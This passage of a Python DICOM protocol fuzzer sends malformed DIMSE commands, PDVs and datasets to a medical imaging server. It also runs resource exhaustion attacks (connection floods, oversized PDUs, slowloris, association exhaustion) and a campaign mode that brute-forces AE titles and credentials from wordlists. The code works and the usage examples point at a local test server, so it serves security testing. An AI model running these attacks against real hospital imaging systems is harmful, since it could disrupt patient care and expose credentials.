        ds_types = [0x0000, 0x0001, 0x0100, 0x0101, 0x0102, 0x00FF, 0xFF00, 0xFFFF]
        
        with self._create_connection() as conn:
            if not conn.connect():
                return
            
            ctx_id = self._establish_association(conn, {
                CT_IMAGE_STORAGE_SOP_CLASS_UID: [DEFAULT_TRANSFER_SYNTAX_UID]
            })
            if not ctx_id:
                return
            
            for ds_type in ds_types:
                dimse = C_STORE_RQ(
                    affected_sop_class_uid=CT_IMAGE_STORAGE_SOP_CLASS_UID,
                    affected_sop_instance_uid=generate_random_uid(),
                    message_id=random.randint(1, 65535)
                )
                dimse.data_set_type = ds_type
                
                # Send command
                pdata_cmd = self._build_dimse_pdata(bytes(dimse), ctx_id, is_command=1, is_last=1)
                conn.send_raw(pdata_cmd)
                
                # Send dataset if type indicates data present
                if ds_type in [0x0000, 0x0001]:
                    dataset = create_minimal_dataset(CT_IMAGE_STORAGE_SOP_CLASS_UID)
                    pdata_data = self._build_dimse_pdata(dataset, ctx_id, is_command=0, is_last=1)
                    yield self._send_and_check(conn, pdata_data, f"ds_type_0x{ds_type:04X}", category)
                else:
                    resp = conn.recv_pdu(timeout=3)
                    yield FuzzResult(
                        test_name=f"ds_type_0x{ds_type:04X}",
                        test_category=category,
                        success=True,
                        response_type=f"PDU_0x{resp[0]:02X}" if resp else "NO_RESPONSE"
                    )
    
    def _uid_fuzzing(self) -> Generator[FuzzResult, None, None]:
        """Fuzz UID fields in DIMSE commands."""
        category = "dimse_uid"
        
        with self._create_connection() as conn:
            if not conn.connect():
                return
            
            ctx_id = self._establish_association(conn, {
                CT_IMAGE_STORAGE_SOP_CLASS_UID: [DEFAULT_TRANSFER_SYNTAX_UID]
            })
            if not ctx_id:
                return
            
            # Generate various malformed UIDs
            for i in range(20 if self.intensity >= FuzzIntensity.MEDIUM else 5):
                malformed_uid = generate_malformed_uid()
                
                dimse = C_STORE_RQ(
                    affected_sop_class_uid=malformed_uid.decode('latin-1', errors='replace'),
                    affected_sop_instance_uid=malformed_uid.decode('latin-1', errors='replace'),
                    message_id=random.randint(1, 65535)
                )
                
                pdata = self._build_dimse_pdata(bytes(dimse), ctx_id)
                yield self._send_and_check(conn, pdata, f"malformed_uid_{i}", category)
    
    def _pdv_fuzzing(self) -> Generator[FuzzResult, None, None]:
        """Fuzz PDV (Presentation Data Value) structure."""
        category = "dimse_pdv"
        
        with self._create_connection() as conn:
            if not conn.connect():
                return
            
            ctx_id = self._establish_association(conn)
            if not ctx_id:
                return
            
            dimse = bytes(C_ECHO_RQ(message_id=1))
            
            # Test various context IDs in PDV
            for test_ctx_id in [0, 2, 254, 255]:  # Invalid context IDs
                pdv = PresentationDataValueItem(
                    context_id=test_ctx_id,
                    data=dimse,
                    is_command=1,
                    is_last=1
                )
                pdata = bytes(DICOM() / P_DATA_TF(pdv_items=[pdv]))
                yield self._send_and_check(conn, pdata, f"pdv_ctx_{test_ctx_id}", category)
            
            # Test message control header combinations
            for is_cmd in [0, 1]:
                for is_last in [0, 1]:
                    for reserved in [0, 0x3F, 0xFC]:
                        pdv = PresentationDataValueItem(
                            context_id=ctx_id,
                            data=dimse,
                            is_command=is_cmd,
                            is_last=is_last,
                            reserved_bits=reserved
                        )
                        pdata = bytes(DICOM() / P_DATA_TF(pdv_items=[pdv]))
                        yield self._send_and_check(
                            conn, pdata,
                            f"pdv_ctrl_cmd{is_cmd}_last{is_last}_rsv{reserved:02X}",
                            category
                        )
            
            # Multiple PDVs in one P-DATA
            pdvs = [
                PresentationDataValueItem(context_id=ctx_id, data=dimse, is_command=1, is_last=1),
                PresentationDataValueItem(context_id=ctx_id, data=dimse, is_command=1, is_last=1),
            ]
            pdata = bytes(DICOM() / P_DATA_TF(pdv_items=pdvs))
            yield self._send_and_check(conn, pdata, "multiple_pdvs", category)
            
            # Empty PDV
            pdv = PresentationDataValueItem(context_id=ctx_id, data=b"", is_command=1, is_last=1)
            pdata = bytes(DICOM() / P_DATA_TF(pdv_items=[pdv]))
            yield self._send_and_check(conn, pdata, "empty_pdv", category)


# =============================================================================
# Dataset Fuzzer
# =============================================================================

class DatasetFuzzer(BaseFuzzer):
    """
    Fuzzer for DICOM dataset content.
    
    Attacks:
    - Malformed DICOM elements
    - Invalid VRs
    - Nested sequences
    - Undefined length items
    - Private elements
    """
    
    def get_test_generators(self) -> List[Tuple[str, Callable]]:
        return [
            ("dataset_element_fuzzing", self._element_fuzzing),
            ("dataset_vr_fuzzing", self._vr_fuzzing),
            ("dataset_sequence_fuzzing", self._sequence_fuzzing),
            ("dataset_private_elements", self._private_element_fuzzing),
            ("dataset_boundary_values", self._boundary_value_fuzzing),
            ("dataset_mutation", self._mutation_fuzzing),
        ]
    
    def _store_dataset(self, conn: RawDICOMConnection, ctx_id: int,
                       dataset: bytes, test_name: str, category: str) -> FuzzResult:
        """Send C-STORE with dataset."""
        sop_class = CT_IMAGE_STORAGE_SOP_CLASS_UID
        sop_instance = generate_random_uid()
        
        dimse = C_STORE_RQ(
            affected_sop_class_uid=sop_class,
            affected_sop_instance_uid=sop_instance,
            message_id=random.randint(1, 65535)
        )
        
        # Send command
        pdv_cmd = PresentationDataValueItem(
            context_id=ctx_id,
            data=bytes(dimse),
            is_command=1,
            is_last=1
        )
        conn.send_raw(bytes(DICOM() / P_DATA_TF(pdv_items=[pdv_cmd])))
        
        # Send dataset
        pdv_data = PresentationDataValueItem(
            context_id=ctx_id,
            data=dataset,
            is_command=0,
            is_last=1
        )
        return self._send_and_check(
            conn, bytes(DICOM() / P_DATA_TF(pdv_items=[pdv_data])),
            test_name, category
        )
    
    def _establish_store_association(self, conn: RawDICOMConnection) -> Optional[int]:
        """Establish association for C-STORE."""
        app_ctx = DICOMVariableItem() / DICOMApplicationContext()
        pctx = build_presentation_context_rq(
            1, CT_IMAGE_STORAGE_SOP_CLASS_UID, [DEFAULT_TRANSFER_SYNTAX_UID]
        )
        user_info = build_user_information(max_pdu_length=self.target.max_pdu_length)
        
        assoc = DICOM() / A_ASSOCIATE_RQ(
            called_ae_title=self.target.ae_title,
            calling_ae_title=self.target.calling_ae,
            variable_items=[app_ctx, pctx, user_info]
        )
        
        conn.send_raw(bytes(assoc))
        resp = conn.recv_pdu(timeout=5)
        
        if resp and resp[0] == PDU_TYPE_ASSOCIATE_AC:
            return 1
        return None
    
    def _element_fuzzing(self) -> Generator[FuzzResult, None, None]:
        """Fuzz DICOM element structures."""
        category = "dataset_element"
        
        with self._create_connection() as conn:
            if not conn.connect():
                return
            
            ctx_id = self._establish_store_association(conn)
            if not ctx_id:
                return
            
            # Empty dataset
            yield self._store_dataset(conn, ctx_id, b"", "empty_dataset", category)
        
        # Single malformed elements
        malformed_elements = [
            ("truncated_tag", struct.pack("<H", 0x0008)),  # Only half a tag
            ("truncated_length", struct.pack("<HH", 0x0008, 0x0016)),  # Tag but no length
            ("zero_tag", struct.pack("<HHI", 0x0000, 0x0000, 0) + b""),
            ("max_tag", struct.pack("<HHI", 0xFFFF, 0xFFFF, 4) + b"TEST"),
            ("huge_length", struct.pack("<HHI", 0x0008, 0x0016, 0x7FFFFFFF)),
            ("negative_length", struct.pack("<HHI", 0x0008, 0x0016, 0xFFFFFFFF)),
        ]
        
        for name, element in malformed_elements:
            with self._create_connection() as conn:
                if not conn.connect():
                    continue
                ctx_id = self._establish_store_association(conn)
                if ctx_id:
                    yield self._store_dataset(conn, ctx_id, element, name, category)
    
    def _vr_fuzzing(self) -> Generator[FuzzResult, None, None]:
        """Fuzz explicit VR encoding."""
        category = "dataset_vr"
        
        # Build datasets with explicit VR (Transfer Syntax 1.2.840.10008.1.2.1)
        vr_tests = [
            ("invalid_vr_XX", b"\x08\x00\x16\x00XX\x04\x00TEST"),
            ("invalid_vr_00", b"\x08\x00\x16\x00\x00\x00\x04\x00TEST"),
            ("invalid_vr_FF", b"\x08\x00\x16\x00\xFF\xFF\x04\x00TEST"),
            ("vr_length_mismatch", b"\x08\x00\x16\x00UI\x00\x10" + b"1.2.3" + b"\x00" * 11),
        ]
        
        for name, dataset in vr_tests:
            with self._create_connection() as conn:
                if not conn.connect():
                    continue
                
                # Use explicit VR transfer syntax
                app_ctx = DICOMVariableItem() / DICOMApplicationContext()
                pctx = build_presentation_context_rq(
                    1, CT_IMAGE_STORAGE_SOP_CLASS_UID,
                    ["1.2.840.10008.1.2.1"]  # Explicit VR Little Endian
                )
                user_info = build_user_information()
                
                assoc = DICOM() / A_ASSOCIATE_RQ(
                    called_ae_title=self.target.ae_title,
                    calling_ae_title=self.target.calling_ae,
                    variable_items=[app_ctx, pctx, user_info]
                )
                
                conn.send_raw(bytes(assoc))
                resp = conn.recv_pdu(timeout=3)
                if resp and resp[0] == PDU_TYPE_ASSOCIATE_AC:
                    yield self._store_dataset(conn, 1, dataset, name, category)
    
    def _sequence_fuzzing(self) -> Generator[FuzzResult, None, None]:
        """Fuzz DICOM sequence structures."""
        category = "dataset_sequence"
        
        # Sequence delimiters
        SEQ_DELIM = struct.pack("<HHIHHI", 0xFFFE, 0xE00D, 0, 0xFFFE, 0xE0DD, 0)
        ITEM_DELIM = struct.pack("<HHI", 0xFFFE, 0xE00D, 0)
        ITEM_START = struct.pack("<HHI", 0xFFFE, 0xE000, 0xFFFFFFFF)  # Undefined length
        
        sequence_tests = [
            # Nested sequences
            ("deep_nesting_10", self._build_nested_sequence(10)),
            ("deep_nesting_100", self._build_nested_sequence(100)),
            
            # Malformed sequences
            ("unclosed_sequence", struct.pack("<HHI", 0x0008, 0x1115, 0xFFFFFFFF) + ITEM_START),
            ("unclosed_item", struct.pack("<HHI", 0x0008, 0x1115, 0xFFFFFFFF) + ITEM_START + b"data"),
            ("extra_delimiters", struct.pack("<HHI", 0x0008, 0x1115, 8) + ITEM_DELIM + ITEM_DELIM),
            ("nested_delimiters", SEQ_DELIM * 10),
        ]
        
        for name, dataset in sequence_tests:
            with self._create_connection() as conn:
                if not conn.connect():
                    continue
                ctx_id = self._establish_store_association(conn)
                if ctx_id:
                    # Prepend required elements
                    full_dataset = create_minimal_dataset() + dataset
                    yield self._store_dataset(conn, ctx_id, full_dataset, name, category)
    
    def _build_nested_sequence(self, depth: int) -> bytes:
        """Build deeply nested sequence."""
        result = b""
        
        # Open sequences
        for i in range(depth):
            # Sequence tag with undefined length
            result += struct.pack("<HHI", 0x0008, 0x1115, 0xFFFFFFFF)
            # Item with undefined length
            result += struct.pack("<HHI", 0xFFFE, 0xE000, 0xFFFFFFFF)
        
        # Add some data in innermost item
        result += struct.pack("<HHI", 0x0010, 0x0020, 4) + b"TEST"
        
        # Close all items and sequences
        for i in range(depth):
            result += struct.pack("<HHI", 0xFFFE, 0xE00D, 0)  # Item delimiter
            result += struct.pack("<HHI", 0xFFFE, 0xE0DD, 0)  # Sequence delimiter
        
        return result
    
    def _private_element_fuzzing(self) -> Generator[FuzzResult, None, None]:
        """Fuzz private DICOM elements."""
        category = "dataset_private"
        
        private_tests = [
            # Private creator
            ("private_creator", struct.pack("<HHI", 0x0009, 0x0010, 6) + b"FUZZ\x00\x00"),
            # Private element
            ("private_element", struct.pack("<HHI", 0x0009, 0x1000, 100) + b"X" * 100),
            # Many private groups
            ("many_private_groups", b"".join(
                struct.pack("<HHI", 0x0009 + i * 2, 0x0010, 4) + b"TEST"
                for i in range(100)
            )),
        ]
        
        for name, private_data in private_tests:
            with self._create_connection() as conn:
                if not conn.connect():
                    continue
                ctx_id = self._establish_store_association(conn)
                if ctx_id:
                    full_dataset = create_minimal_dataset() + private_data
                    yield self._store_dataset(conn, ctx_id, full_dataset, name, category)
    
    def _boundary_value_fuzzing(self) -> Generator[FuzzResult, None, None]:
        """Fuzz boundary values in dataset elements."""
        category = "dataset_boundary"
        
        boundary_tests = [
            # Length boundaries
            ("length_0", struct.pack("<HHI", 0x0010, 0x0020, 0)),
            ("length_1", struct.pack("<HHI", 0x0010, 0x0020, 1) + b"X"),
            ("length_max_16", struct.pack("<HHI", 0x0010, 0x0020, 0xFFFF) + b"X" * 0xFFFF),
            
            # Tag boundaries
            ("tag_0000_0000", struct.pack("<HHI", 0x0000, 0x0000, 4) + b"TEST"),
            ("tag_FFFF_FFFF", struct.pack("<HHI", 0xFFFF, 0xFFFF, 4) + b"TEST"),
            ("tag_7FFF_FFFF", struct.pack("<HHI", 0x7FFF, 0xFFFF, 4) + b"TEST"),
        ]
        
        for name, element in boundary_tests:
            with self._create_connection() as conn:
                if not conn.connect():
                    continue
                ctx_id = self._establish_store_association(conn)
                if ctx_id:
                    full_dataset = create_minimal_dataset() + element
                    yield self._store_dataset(conn, ctx_id, full_dataset, name, category)
    
    def _mutation_fuzzing(self) -> Generator[FuzzResult, None, None]:
        """Apply random mutations to valid datasets."""
        category = "dataset_mutation"
        
        base_dataset = create_minimal_dataset()
        
        mutations = [
            ("bit_flip_1", lambda d: random_bit_flip(d, 1)),
            ("bit_flip_10", lambda d: random_bit_flip(d, 10)),
            ("bit_flip_50", lambda d: random_bit_flip(d, 50)),
            ("byte_insert_1", lambda d: random_byte_insert(d, 1)),
            ("byte_insert_10", lambda d: random_byte_insert(d, 10)),
            ("byte_delete_1", lambda d: random_byte_delete(d, 1)),
            ("byte_delete_10", lambda d: random_byte_delete(d, 10)),
            ("random_chunk", lambda d: d[:len(d)//2] + bytes(random.randint(0,255) for _ in range(50)) + d[len(d)//2:]),
        ]
        
        iterations = 10 if self.intensity >= FuzzIntensity.MEDIUM else 3
        
        for name, mutator in mutations:
            for i in range(iterations):
                with self._create_connection() as conn:
                    if not conn.connect():
                        continue
                    ctx_id = self._establish_store_association(conn)
                    if ctx_id:
                        mutated = mutator(base_dataset)
                        yield self._store_dataset(conn, ctx_id, mutated, f"{name}_{i}", category)


# =============================================================================
# Resource Exhaustion Fuzzer
# =============================================================================

class ResourceExhaustionFuzzer(BaseFuzzer):
    """
    Fuzzer for resource exhaustion attacks.
    
    Attacks:
    - Connection flooding
    - Memory exhaustion via large PDUs
    - Slowloris-style attacks
    - Association table exhaustion
    """
    
    def __init__(self, target: TargetConfig, intensity: FuzzIntensity = FuzzIntensity.MEDIUM,
                 max_connections: int = 100):
        super().__init__(target, intensity)
        self.max_connections = max_connections
    
    def get_test_generators(self) -> List[Tuple[str, Callable]]:
        return [
            ("resource_connection_flood", self._connection_flood),
            ("resource_large_pdu", self._large_pdu_attack),
            ("resource_slowloris", self._slowloris_attack),
            ("resource_association_exhaustion", self._association_exhaustion),
            ("resource_rapid_operations", self._rapid_operations),
        ]
    
    def _connection_flood(self) -> Generator[FuzzResult, None, None]:
        """Open many connections simultaneously."""
        category = "resource_connection"
        connections = []
        
        num_conns = min(self.max_connections, 50 if self.intensity == FuzzIntensity.LOW else 200)
        
        try:
            for i in range(num_conns):
                try:
                    sock = socket.create_connection(
                        (self.target.ip, self.target.port),
                        timeout=1
                    )
                    connections.append(sock)
                except Exception as e:
                    yield FuzzResult(
                        test_name=f"connection_flood_{i}",
                        test_category=category,
                        success=False,
                        crash_detected=True,
                        crash_type=CrashType.CONNECTION_REFUSED,
                        error_message=str(e),
                        notes=f"Failed at connection {i}"
                    )
                    break
            
            yield FuzzResult(
                test_name=f"connection_flood_{len(connections)}_total",
                test_category=category,
                success=True,
                notes=f"Opened {len(connections)} connections"
            )
            
        finally:
            for sock in connections:
                try:
                    sock.close()
                except Exception:
                    pass
    
    def _large_pdu_attack(self) -> Generator[FuzzResult, None, None]:
        """Send very large PDUs."""
        category = "resource_large_pdu"
        
        sizes = [
            ("1KB", 1024),
            ("10KB", 10 * 1024),
            ("100KB", 100 * 1024),
            ("1MB", 1024 * 1024),
            ("10MB", 10 * 1024 * 1024),
        ]
        
        if self.intensity >= FuzzIntensity.HIGH:
            sizes.append(("50MB", 50 * 1024 * 1024))
        
        for name, size in sizes:
            with self._create_connection() as conn:
                if not conn.connect():
                    continue
                
                # Create large A-ASSOCIATE-RQ
                padding = b"X" * size
                pdu = create_raw_pdu(PDU_TYPE_ASSOCIATE_RQ, padding)
                
                start = time.time()
                try:
                    conn.send_raw(pdu)
                    resp = conn.recv_pdu(timeout=10)
                    yield FuzzResult(
                        test_name=f"large_pdu_{name}",
                        test_category=category,
                        success=True,
                        response_type=f"PDU_0x{resp[0]:02X}" if resp else "NO_RESPONSE",
                        duration_ms=(time.time() - start) * 1000
                    )
                except Exception as e:
                    yield FuzzResult(
                        test_name=f"large_pdu_{name}",
                        test_category=category,
                        success=False,
                        crash_detected="reset" in str(e).lower(),
                        error_message=str(e),
                        duration_ms=(time.time() - start) * 1000
                    )
    
    def _slowloris_attack(self) -> Generator[FuzzResult, None, None]:
        """Slowloris-style attack - send data very slowly."""
        category = "resource_slowloris"
        
        app_ctx = DICOMVariableItem() / DICOMApplicationContext()
        pctx = build_presentation_context_rq(1, VERIFICATION_SOP_CLASS_UID, [DEFAULT_TRANSFER_SYNTAX_UID])
        user_info = build_user_information()
        
        assoc = bytes(DICOM() / A_ASSOCIATE_RQ(
            called_ae_title=self.target.ae_title,
            calling_ae_title=self.target.calling_ae,
            variable_items=[app_ctx, pctx, user_info]
        ))
        
        # Send byte-by-byte with delays
        with self._create_connection() as conn:
            if not conn.connect():
                return
            
            start = time.time()
            for i, byte in enumerate(assoc):
                try:
                    conn.send_raw(bytes([byte]))
                    time.sleep(0.1)  # 100ms between bytes
                    
                    if i > 50:  # Don't take forever
                        break
                except Exception as e:
                    yield FuzzResult(
                        test_name="slowloris",
                        test_category=category,
                        success=False,
                        error_message=str(e),
                        duration_ms=(time.time() - start) * 1000,
                        notes=f"Failed at byte {i}"
                    )
                    return
            
            yield FuzzResult(
                test_name="slowloris",
                test_category=category,
                success=True,
                duration_ms=(time.time() - start) * 1000,
                notes=f"Sent {min(51, len(assoc))} bytes slowly"
            )
    
    def _association_exhaustion(self) -> Generator[FuzzResult, None, None]:
        """Try to exhaust association table."""
        category = "resource_association"
        
        num_assocs = 20 if self.intensity == FuzzIntensity.LOW else 100
        
        connections = []
        successful = 0
        
        try:
            for i in range(num_assocs):
                conn = self._create_connection()
                if not conn.connect():
                    continue
                
                # Send association request
                app_ctx = DICOMVariableItem() / DICOMApplicationContext()
                pctx = build_presentation_context_rq(1, VERIFICATION_SOP_CLASS_UID, [DEFAULT_TRANSFER_SYNTAX_UID])
                user_info = build_user_information()
                
                assoc = DICOM() / A_ASSOCIATE_RQ(
                    called_ae_title=self.target.ae_title,
                    calling_ae_title=f"EXHAUST_{i:03d}",
                    variable_items=[app_ctx, pctx, user_info]
                )
                
                conn.send_raw(bytes(assoc))
                resp = conn.recv_pdu(timeout=2)
                
                if resp and resp[0] == PDU_TYPE_ASSOCIATE_AC:
                    successful += 1
                    connections.append(conn)
                else:
                    conn.close()
                    break
            
            yield FuzzResult(
                test_name=f"association_exhaustion",
                test_category=category,
                success=True,
                notes=f"Established {successful} simultaneous associations"
            )
            
        finally:
            for conn in connections:
                try:
                    conn.send_raw(bytes(DICOM() / A_RELEASE_RQ()))
                except Exception:
                    pass
                conn.close()
    
    def _rapid_operations(self) -> Generator[FuzzResult, None, None]:
        """Rapid-fire DIMSE operations."""
        category = "resource_rapid"
        
        with self._create_connection() as conn:
            if not conn.connect():
                return
            
            # Establish association
            app_ctx = DICOMVariableItem() / DICOMApplicationContext()
            pctx = build_presentation_context_rq(1, VERIFICATION_SOP_CLASS_UID, [DEFAULT_TRANSFER_SYNTAX_UID])
            user_info = build_user_information()
            
            assoc = DICOM() / A_ASSOCIATE_RQ(
                called_ae_title=self.target.ae_title,
                calling_ae_title=self.target.calling_ae,
                variable_items=[app_ctx, pctx, user_info]
            )
            
            conn.send_raw(bytes(assoc))
            resp = conn.recv_pdu(timeout=5)
            
            if not resp or resp[0] != PDU_TYPE_ASSOCIATE_AC:
                return
            
            # Send many C-ECHOs without waiting
            num_ops = 100 if self.intensity == FuzzIntensity.LOW else 1000
            
            start = time.time()
            for i in range(num_ops):
                dimse = C_ECHO_RQ(message_id=(i % 65535) + 1)
                pdv = PresentationDataValueItem(
                    context_id=1,
                    data=bytes(dimse),
                    is_command=1,
                    is_last=1
                )
                pdata = bytes(DICOM() / P_DATA_TF(pdv_items=[pdv]))
                
                try:
                    conn.send_raw(pdata)
                except Exception:
                    break
            
            yield FuzzResult(
                test_name=f"rapid_echo_{num_ops}",
                test_category=category,
                success=True,
                duration_ms=(time.time() - start) * 1000,
                notes=f"Sent {num_ops} C-ECHOs rapidly"
            )


# =============================================================================
# Campaign Mode Fuzzer
# =============================================================================

class CampaignFuzzer:
    """
    Long-running fuzzing campaign orchestrator.
    
    Manages multiple fuzzer types, rotation, statistics, and crash logging.
    """
    
    def __init__(self, target: TargetConfig, intensity: FuzzIntensity = FuzzIntensity.MEDIUM,
                 ae_wordlist: str = None, user_wordlist: str = None, pass_wordlist: str = None,
                 crash_log_path: str = "crashes"):
        self.target = target
        self.intensity = intensity
        self.crash_log_path = Path(crash_log_path)
        self.crash_log_path.mkdir(exist_ok=True)
        
        self.fuzzers: List[BaseFuzzer] = [
            StateMachineFuzzer(target, intensity),
            AuthenticationFuzzer(target, intensity, ae_wordlist, user_wordlist, pass_wordlist),
            PDUFuzzer(target, intensity),
            DIMSEFuzzer(target, intensity),
            DatasetFuzzer(target, intensity),
            ResourceExhaustionFuzzer(target, intensity),
        ]
        
        self.stats = FuzzStatistics()
        self.stop_requested = False
        self.current_fuzzer_idx = 0
    
    def run(self, duration: float = None, max_tests: int = None) -> FuzzStatistics:
        """Run fuzzing campaign."""
        start_time = time.time()
        test_count = 0
        
        log.info(f"Starting campaign with {len(self.fuzzers)} fuzzers, intensity={self.intensity.name}")
        
        while not self.stop_requested:
            fuzzer = self.fuzzers[self.current_fuzzer_idx]
            fuzzer_name = type(fuzzer).__name__
            
            log.info(f"Running {fuzzer_name}...")
            
            try:
                # Run each fuzzer for a limited time/tests
                fuzzer_max_tests = 100 if self.intensity == FuzzIntensity.LOW else 500
                fuzzer_stats = fuzzer.run(max_tests=fuzzer_max_tests)
                
                # Aggregate stats
                self.stats.total_tests += fuzzer_stats.total_tests
                self.stats.passed += fuzzer_stats.passed
                self.stats.failed += fuzzer_stats.failed
                self.stats.crashes += fuzzer_stats.crashes
                self.stats.crash_hashes.update(fuzzer_stats.crash_hashes)
                
                for cat, cat_stats in fuzzer_stats.results_by_category.items():
                    for key, val in cat_stats.items():
                        self.stats.results_by_category[cat][key] += val
                
                test_count += fuzzer_stats.total_tests
                
            except Exception as e:
                log.error(f"Error in {fuzzer_name}: {e}")
                if log.isEnabledFor(logging.DEBUG):
                    traceback.print_exc()
            
            # Check termination conditions
            if max_tests and test_count >= max_tests:
                break
            
            if duration and (time.time() - start_time) >= duration:
                break
            
            # Rotate to next fuzzer
            self.current_fuzzer_idx = (self.current_fuzzer_idx + 1) % len(self.fuzzers)
            
            # Log progress
            elapsed = time.time() - start_time
            rate = test_count / max(elapsed, 1)
            log.info(f"Progress: {test_count} tests, {self.stats.crashes} crashes, "
                    f"{rate:.1f} tests/sec, {elapsed:.0f}s elapsed")
        
        self.stats.end_time = time.time()
        return self.stats
    
    def stop(self) -> None:
        """Stop campaign."""
        self.stop_requested = True
        for fuzzer in self.fuzzers:
            fuzzer.stop()
    
    def save_crash(self, result: FuzzResult) -> None:
        """Save crash details to file."""
        if not result.raw_request:
            return
        
        crash_hash = hash_crash(result.raw_request, result.error_message or "")
        crash_file = self.crash_log_path / f"crash_{crash_hash}.json"
        
        crash_data = {
            "timestamp": datetime.now().isoformat(),
            "test_name": result.test_name,
            "test_category": result.test_category,
            "crash_type": result.crash_type.name if result.crash_type else None,
            "error_message": result.error_message,
            "raw_request_hex": result.raw_request.hex() if result.raw_request else None,
            "raw_response_hex": result.raw_response.hex() if result.raw_response else None,
        }
        
        with open(crash_file, 'w') as f:
            json.dump(crash_data, f, indent=2)


# =============================================================================
# Main Entry Point
# =============================================================================

def main():
    parser = argparse.ArgumentParser(
        description="DICOM Protocol Fuzzer v4.0 - Comprehensive Security Testing",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Fuzzing Modes:
  association     - Association handshake fuzzing
  state           - State machine confusion attacks  
  auth            - Authentication fuzzing (AE titles, credentials)
  pdu             - PDU structure fuzzing
  dimse           - DIMSE command fuzzing
  dataset         - Dataset content fuzzing
  resource        - Resource exhaustion attacks
  campaign        - Long-running comprehensive campaign
  all             - Run all fuzzers once

Examples:
  # Quick association test
  python dicom_fuzzer.py --ip 127.0.0.1 --port 4242 --ae-title ORTHANC --mode association

  # AE title brute force
  python dicom_fuzzer.py --ip 127.0.0.1 --port 4242 --ae-title ORTHANC --mode auth \\
      --ae-wordlist wordlists/ae_titles.txt

  # Full 1-hour campaign
  python dicom_fuzzer.py --ip 127.0.0.1 --port 4242 --ae-title ORTHANC --mode campaign \\
      --duration 3600 --intensity high

  # State machine attacks with debug output
  python dicom_fuzzer.py --ip 127.0.0.1 --port 4242 --ae-title ORTHANC --mode state --debug
""",
    )
    
    parser.add_argument("--ip", required=True, help="Target DICOM SCP IP address")
    parser.add_argument("--port", type=int, required=True, help="Target DICOM SCP port")
    parser.add_argument("--ae-title", required=True, help="Target AE Title")
    parser.add_argument("--calling-ae", default="FUZZ_SCU", help="Our calling AE Title")
    parser.add_argument("--timeout", type=int, default=10, help="Network timeout (seconds)")
    
    parser.add_argument("--mode", required=True,
                       choices=["association", "state", "auth", "pdu", "dimse", 
                               "dataset", "resource", "campaign", "all"],
                       help="Fuzzing mode")
    
    parser.add_argument("--intensity", choices=["low", "medium", "high", "extreme"],
                       default="medium", help="Fuzzing intensity")
    
    parser.add_argument("--duration", type=float, help="Campaign duration in seconds")
    parser.add_argument("--max-tests", type=int, help="Maximum number of tests")
    
    parser.add_argument("--ae-wordlist", help="Path to AE title wordlist")
    parser.add_argument("--user-wordlist", help="Path to username wordlist")
    parser.add_argument("--pass-wordlist", help="Path to password wordlist")
    
    parser.add_argument("--crash-log", default="crashes", help="Directory for crash logs")
    parser.add_argument("--debug", action="store_true", help="Enable debug logging")
    
    args = parser.parse_args()
    
    # Setup logging
    log_level = logging.DEBUG if args.debug else logging.INFO
    logging.basicConfig(
        level=log_level,
        format="%(asctime)s - %(levelname)s - %(message)s",
        datefmt="%Y-%m-%d %H:%M:%S"
    )
    
    # Parse intensity
    intensity_map = {
        "low": FuzzIntensity.LOW,
        "medium": FuzzIntensity.MEDIUM,
        "high": FuzzIntensity.HIGH,
        "extreme": FuzzIntensity.EXTREME,
    }
    intensity = intensity_map[args.intensity]
    
    # Create target config
    target = TargetConfig(
        ip=args.ip,
        port=args.port,
        ae_title=args.ae_title,
        calling_ae=args.calling_ae,
        timeout=args.timeout,
    )
    
    log.info(f"=== DICOM Fuzzer v4.0 ===")
    log.info(f"Target: {target.ip}:{target.port} AE={target.ae_title}")
    log.info(f"Mode: {args.mode} | Intensity: {args.intensity}")
    
    # Setup signal handler for graceful shutdown
    fuzzer = None
    
    def signal_handler(sig, frame):
        log.info("Interrupt received, stopping...")
        if fuzzer:
            fuzzer.stop()
    
    signal.signal(signal.SIGINT, signal_handler)
    signal.signal(signal.SIGTERM, signal_handler)
    
    # Run appropriate fuzzer
    try:
        if args.mode == "campaign":
            fuzzer = CampaignFuzzer(
                target, intensity,
                ae_wordlist=args.ae_wordlist,
                user_wordlist=args.user_wordlist,
                pass_wordlist=args.pass_wordlist,
                crash_log_path=args.crash_log
            )
            stats = fuzzer.run(duration=args.duration, max_tests=args.max_tests)
        
        elif args.mode == "all":
            # Run all fuzzers once
            fuzzers = [
                ("State Machine", StateMachineFuzzer(target, intensity)),
                ("Authentication", AuthenticationFuzzer(target, intensity,
                    args.ae_wordlist, args.user_wordlist, args.pass_wordlist)),
                ("PDU Structure", PDUFuzzer(target, intensity)),
                ("DIMSE Commands", DIMSEFuzzer(target, intensity)),
                ("Dataset", DatasetFuzzer(target, intensity)),
                ("Resource Exhaustion", ResourceExhaustionFuzzer(target, intensity)),
            ]
            
            combined_stats = FuzzStatistics()
            for name, fuzz in fuzzers:
                log.info(f"\n=== Running {name} Fuzzer ===")
                fuzzer = fuzz
                fuzz_stats = fuzz.run(max_tests=args.max_tests)
                combined_stats.total_tests += fuzz_stats.total_tests
                combined_stats.passed += fuzz_stats.passed
                combined_stats.failed += fuzz_stats.failed
                combined_stats.crashes += fuzz_stats.crashes
                combined_stats.crash_hashes.update(fuzz_stats.crash_hashes)
            
            stats = combined_stats
            stats.end_time = time.time()
        
        else:
            # Single fuzzer mode
            fuzzer_map = {
                "association": lambda: StateMachineFuzzer(target, intensity),
                "state": lambda: StateMachineFuzzer(target, intensity),
                "auth": lambda: AuthenticationFuzzer(target, intensity,
                    args.ae_wordlist, args.user_wordlist, args.pass_wordlist),
                "pdu": lambda: PDUFuzzer(target, intensity),
                "dimse": lambda: DIMSEFuzzer(target, intensity),
                "dataset": lambda: DatasetFuzzer(target, intensity),
                "resource": lambda: ResourceExhaustionFuzzer(target, intensity),
            }
            
            fuzzer = fuzzer_map[args.mode]()
            stats = fuzzer.run(duration=args.duration, max_tests=args.max_tests)
        
        # Print summary
        print("\n" + stats.summary())
        
        # Report valid credentials found
        if args.mode in ["auth", "campaign", "all"]:
            if isinstance(fuzzer, AuthenticationFuzzer):
                if fuzzer.valid_ae_titles:
                    print(f"\nValid AE Titles found: {fuzzer.valid_ae_titles}")
                if fuzzer.valid_credentials:
                    print(f"Valid credentials found: {fuzzer.valid_credentials}")
        
        if stats.crashes > 0:
            print(f"\n⚠️  {stats.crashes} crashes detected! Check crash logs.")
            sys.exit(1)
        
    except Exception as e:
        log.error(f"Fatal error: {e}")
        if args.debug:
            traceback.print_exc()
        sys.exit(2)
    
    log.info("=== Fuzzing Complete ===")


if __name__ == "__main__":
    main()